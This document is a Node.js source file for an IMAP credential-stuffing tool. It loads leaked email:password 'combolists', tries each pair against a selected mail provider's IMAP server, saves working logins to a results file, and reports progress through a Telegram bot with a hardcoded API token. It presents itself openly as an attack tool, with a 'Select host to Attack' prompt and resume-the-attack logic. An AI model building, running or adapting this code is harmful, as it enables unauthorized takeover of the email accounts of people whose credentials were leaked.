process.env["NTBA_FIX_319"] = 1; // telegram bot warning fix

// dependencies

var hashFile = require('sha256-file');
const sleep = require('sleep');
const imaps = require('imap-simple');
const fs = require('fs');
const cliProgress = require('cli-progress');
const TelegramBot = require('node-telegram-bot-api');
var configs = require('./imaps.json');
const progressBar = new cliProgress.SingleBar({ forceRedraw: true }, cliProgress.Presets.shades_classic);
const inquirer = require('inquirer');
const RESULT_FILE = "results.txt";
const SAVE_FILE = "save.json";
// global vars
var filePath;
var resumeSave = false;
var unreachbleHost = false;
var selection;
var host;
var port;
var tls;
var index = 0;
var max = 0;
var counter = 0;
var found = 0;
var id;
var log = 'Nothing!';
var botEnabled = false;

function createFile(filename) {
    fs.open(filename, 'r', function (err, fd) {
        if (err) {
            fs.writeFile(filename, '', function (err) {
                if (err) {
                    console.log(err);
                }
            });
        }
    });
}

setupBot = () => {
    botEnabled = true;
    const botToken = '1015158198:AAE8d8TzPix7J5vPa9jr0wAsiJjdjocZiOY';
    const bot = new TelegramBot(botToken, { polling: true });

    bot.addListener('polling_error', (error) => {
        handlePollingError();
        botEnabled = false;
        bot.stopPolling();
        process.exit(404);
    });
    bot.onText(/\/status/, (msg, match) => {
        // 'msg' is the received Message from Telegram
        // 'match' is the result of executing the regexp above on the text content
        // of the message
        id = msg.chat.id;
        // send back the matched "whatever" to the chat
        bot.sendMessage(id, 'Current progress is ' + counter + ' / ' + max);
        bot.sendMessage(id, 'Found ' + found + ' working combo...');
    });

    bot.onText(/\/log/, (msg, match) => {
        // 'msg' is the received Message from Telegram
        // 'match' is the result of executing the regexp above on the text content
        // of the message
        id = msg.chat.id;
        // send back the matched "whatever" to the chat
        bot.sendMessage(id, log);

    });


    bot.onText(/\/start/, (msg, match) => {
        // 'msg' is the received Message from Telegram
        // 'match' is the result of executing the regexp above on the text content
        // of the message
        id = msg.chat.id;
        // send back the matched "whatever" to the chat
        bot.sendMessage(id, 'Hello and welcome to the\nIMAP Checker Bot,\n' +
            'Available commands are :\n' +
            '\t/status: Show current progress\n' +
            '\t/log: Show latest error\n');

    });
    selectFilePrompt();
}

clear = () => {
    process.stdout.write('\033c')
};

connect = async (username, password) => {
    var config = {
        imap: {
            user: username,
            password: password,
            host: host,
            port: port,
            tls: tls,
            authTimeout: 5000
        }
    };

    progressBar.increment(1);
    counter++;

    await imaps.connect(config)
        .then(function (connection) {
            found++;
            process.stdout.write(('[*] ' + username + ':' + password + '\r\n').green)
            writeResult(('[*] ' + username + ':' + password + '\r\n').green);
            if (botEnabled)
                bot.sendMessage(id, successMsg);
        }).catch(error => {
            if (error.errno === -3008)
                unreachbleHost = true;
            log = error.toString();
        });
}

parser = (line, selection) => {
    for (let i = 0; i < selection.length; i++)
        for (id in configs[selection[i]].tag)
            if (line.includes(configs[selection[i]].tag[id])) {
                port = configs[selection[i]].port;
                host = configs[selection[i]].host;
                tls = configs[selection[i]].tls;
                return;
            }
    port = -1;
}

handleNoChoice = () => {
    clear();
    process.stdout.write('Please select a least one '.white);
    process.stdout.write('Host'.white.underline.bold);
    process.stdout.write('...'.white)
    sleep.msleep(2500);
    clear();
    selectHostPrompt();
}

handleDictionaryError = () => {
    clear();
    process.stdout.write('Please select a valid '.white);
    process.stdout.write('Dictionary'.white.underline.bold);
    process.stdout.write('...'.white)
    sleep.msleep(2500);
    clear();
    selectFilePrompt();
}

handlePollingError = () => {
    clear();
    process.stdout.write('Failed to retrieve the Telegram API, '.white)
    process.stdout.write('Check your internet connection'.white.bold)
    sleep.msleep(2500);
    clear();
    telegramBotPrompt();
}

showResult = () => {
    const result = fs.readFileSync(RESULT_FILE, { encoding: 'utf-8' });
    console.log(('- Found out ' + found + ' correct combo -\n').white.bold)
    console.log('- Result List -\n'.white.bold)
    console.log(result.random.bold)
    return result;
}

writeResult = (result) => {
    fs.appendFileSync(RESULT_FILE, result)
}

readSave = () => {
    var rawData = fs.readFileSync(SAVE_FILE, { encoding: 'utf-8' });
    return rawData ? JSON.parse(rawData) : [];
}

main = async (path) => {
    const saveData = readSave();
    var line = 0;
    saveData.forEach(element => {
        if (JSON.stringify(element.host) === JSON.stringify(selection) && element.hash === hashFile(path)) {
            line = element.index;
            found = element.found;
            max = element.max;
            counter = element.counter;
            resumeSave = true;
            console.log('Save has been found!\nStarting back the attack from ' +new Date(element.timestamp).toLocaleString());
            sleep.msleep(5000);
        }
    });

    filePath = path;
    var array = fs.readFileSync(path).toString().split("\r\n");
    if (!resumeSave) {
        for (line in array)
            for (let i = 0; i < selection.length; i++)
                for (id in configs[selection[i]].tag)
                    if (array[line].includes(configs[selection[i]].tag[id]))
                        max++;
    }
    clear();
    progressBar.start(max, counter);
    for (line in array) {
        index++;
        parser(array[line], selection);
        if (port !== -1)
            await connect(array[line].slice(0, array[line].indexOf(':')), array[line].slice(array[line].indexOf(':') + 1, array[line].length));
        if (unreachbleHost)
            break;
    }

    onComplete();
}

clear();

var arrayConfigs = [];
for (conf in configs)
    arrayConfigs.push(conf);

var prompt = inquirer.createPromptModule();

selectFilePrompt = () => {
    filePrompt()
        .then(dictionary => {
            main(dictionary.path);
        }).catch(error => {
            handleDictionaryError();
        });
}

onComplete = () => {

    progressBar.stop();
    clear();
    if (unreachbleHost) {
        console.log('Unable to perform the attack check dns or your internet connectivity!'.white.bold)
        return;
    }
    process.stdout.write('- IMAP Attack done -\n'.white.bold)
    process.stdout.write('- Total Mail Tested: '.white.bold);
    console.log(max.toString().white.bold + ' -'.white.bold);
    if (found > 0)
        showResult()
    else
        console.log('\nNothing found, try changing combolist or host :( ...\n'.white.bold)

}

telegramBotPrompt = () => {
    prompt({ type: 'confirm', name: 'activeBot', message: 'Do you want to enable the telegram bot "@ChichkeBOT"' })
        .then(isEnable => {
            if (isEnable.activeBot)
                setupBot();
            else
                selectFilePrompt();
        }).catch(err => {
            console.error(err)
            process.exit(42);
        });
}

filePrompt = () => {
    inquirer.registerPrompt('fuzzypath', require('inquirer-fuzzy-path'))

    return inquirer.prompt([
        {
            type: 'fuzzypath',
            name: 'path',
            // excludePath :: (String) -> Bool
            // excludePath to exclude some paths from the file-system scan
            // excludeFilter :: (String) -> Bool
            // excludeFilter to exclude some paths from the final list, e.g. '.'
            itemType: 'file',
            // itemType :: 'any' | 'directory' | 'file'
            // specify the type of nodes to display
            // default value: 'any'
            // example: itemType: 'file' - hides directories from the item list
            rootPath: './dictionary/',
            // rootPath :: String
            // Root search directory
            message: 'Select your dictionary/combolist',
            default: null,
            suggestOnly: false,
            // suggestOnly :: Bool
            // Restrict prompt answer to available choices or use them as suggestions
            depthLimit: 0,
            // depthLimit :: integer >= 0
            // Limit the depth of sub-folders to scan
            // Defaults to infinite depth if undefined
        }
    ]);
}

selectHostPrompt = () => {
    prompt({ type: 'checkbox', name: 'selection', message: 'Select host to Attack', choices: arrayConfigs, pageSize: 6 })
        .then(array => {
            if (array.selection.length) {
                selection = array.selection;
                telegramBotPrompt();
            } else
                handleNoChoice();
        }).catch(err => {
            console.error(err)
            process.exit(42);
        });
}

createFile(SAVE_FILE);
selectHostPrompt();


process.stdin.resume();//so the program will not close instantly



onCleanup = () => {
    var saveData = readSave();
    var clean = []

    const session = {
        "timestamp": + new Date(),
        "hash": hashFile(filePath),
        "index": index,
        "counter": counter,
        "max": max,
        "found": found,
        "host": selection
    }

    for (const key in saveData) {
        if (saveData.hasOwnProperty(key)) {
            const element = saveData[key];
            if (JSON.stringify(element.host) !== JSON.stringify(selection) || element.hash !== hashFile(filePath))
                clean.push(element)
        }
    }

    clean.push(session)
    fs.writeFileSync(SAVE_FILE, JSON.stringify(clean, null, 2))
}

function exitHandler(options, exitCode) {
    if (options.cleanup) onCleanup();
    if (options.exit) process.exit();
}

//do something when app is closing
process.on('exit', exitHandler.bind(null, { cleanup: true }));

//catches ctrl+c event
process.on('SIGINT', exitHandler.bind(null, { exit: true }));

// catches "kill pid" (for example: nodemon restart)
process.on('SIGUSR1', exitHandler.bind(null, { exit: true }));
process.on('SIGUSR2', exitHandler.bind(null, { exit: true }));

//catches uncaught exceptions
process.on('uncaughtException', exitHandler.bind(null, { exit: true }));